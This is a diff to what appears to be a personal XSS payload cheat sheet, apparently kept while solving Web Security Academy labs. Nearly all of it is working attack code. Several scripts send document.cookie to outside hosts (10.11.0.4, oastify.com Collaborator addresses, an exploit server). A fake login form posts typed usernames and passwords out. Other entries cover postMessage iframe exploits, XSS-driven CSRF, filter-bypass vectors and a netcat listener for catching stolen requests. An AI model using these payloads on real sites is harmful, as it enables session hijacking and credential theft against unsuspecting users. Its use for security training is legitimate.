@@ -14,14 +14,11 @@ foo?&apos;-alert(1)-&apos;
 ${alert(1)}
 
 
-#Cookie Straling
+#Cookie Straling: An XSS payload to steal cookies
 <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
 
 
-
-
 #Exploit Server:
-
 //1-PostMessages
 <iframe src="https://0a1000080333edd5c0964033005400b9.web-security-academy.net/" onload=' this.contentWindow.postMessage("<img src=https://v62ftvfm3278074yfn9mdkh5iwoncd02.oastify.com/?cookie"+document.cookie+" onerror=alert(1); >"+document.cookie,"*") '>
 <iframe src="https://0a1000080333edd5c0964033005400b9.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(1)>","*")'>
@@ -38,9 +35,7 @@ document.getElementById("samFrame").contentWindow.postMessage("{\"type\":\"load-
 
 </script>
 
-
-
-//This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.					
+#This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.					
 <script>
 fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
 method: 'POST',
@@ -49,7 +44,7 @@ body:document.cookie
 });
 </script>
 
-//This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
+#This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
 <input name=username id=username>
 <input type=password name=password onchange="if(this.value.length)fetch('https://nrixqc1u2sdfnvl1am6p5sr6vx1opgd5.oastify.com',{
 method:'POST',
@@ -57,8 +52,8 @@ mode: 'no-cors',
 body:username.value+':'+this.value
 });">
 
-//Exploiting XSS to perform CSRF
-//This will make anyone who views the comment issue a POST request to change their email address to
+#Exploiting XSS to perform CSRF
+#This will make anyone who views the comment issue a POST request to change their email address to
 <script>
 var req = new XMLHttpRequest();
 req.onload = handleResponse;
@@ -76,14 +71,14 @@ function handleResponse() {
 <svg><animatetransform%20§§=1>								//cheat sheet check
 "><svg><animatetransform%20onbegin=alert(1)>
 
-//Reflected XSS in canonical link tag(To assist with your exploit, you can assume that the simulated user will press the following key combinations: Alt+X CTRL+ALT+X) ALT+SHIFT+X
+#Reflected XSS in canonical link tag(To assist with your exploit, you can assume that the simulated user will press the following key combinations: Alt+X CTRL+ALT+X) ALT+SHIFT+X
 https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
 
-//XSS: Cookie redirect
+#XSS: Cookie redirect
 <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
 
-//DOM XSS with postmessage
-//ON the Exploit Server
+#DOM XSS with postmessage
+#ON the Exploit Server
 <iframe src="https://0a19008a0387c880c0c74013009f0065.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
 
 %3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
@@ -98,9 +93,10 @@ Comment=<form id=x tabindex=0 onfocus=print()><input id=attributes>
 <img src=1 onerror='alert(1)'>
 
 
+#Using an iframe to deliver an XSS payload
+<iframe src=http://10.11.0.4/report height="0" width="0"></iframe>
 
-
--------------
-
+#Using Netcat to receive a XSS request
+sudo nc -nvlp 80
 
 
